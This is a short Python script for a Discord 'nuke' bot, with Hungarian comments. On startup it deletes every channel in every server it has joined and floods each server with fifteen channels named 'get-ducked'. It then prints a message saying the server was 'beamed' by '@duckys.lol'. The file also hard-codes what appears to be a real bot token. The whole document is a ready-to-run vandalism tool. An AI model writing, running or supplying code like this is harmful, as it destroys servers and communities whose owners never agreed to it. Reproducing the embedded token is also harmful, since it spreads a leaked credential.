import discord
from discord.ext import commands

intents = discord.Intents.default()
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')

    for guild in bot.guilds:
        # Töröljük az összes csatornát
        for channel in guild.channels:
            await channel.delete()

        # Új csatornák létrehozása
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')
        await guild.create_text_channel('get-ducked')

    print('@everyone WAKE UP, THIS SERVER HAS BEEN BEAMED BY @duckys.lol !')

bot.run('MTM1NTk5NjAyNjk1MTA0MTI3Ng.GM0Wlo.1dKwZI02seuu-ro860PBOEMIm4XCtwgc6nfKkA')
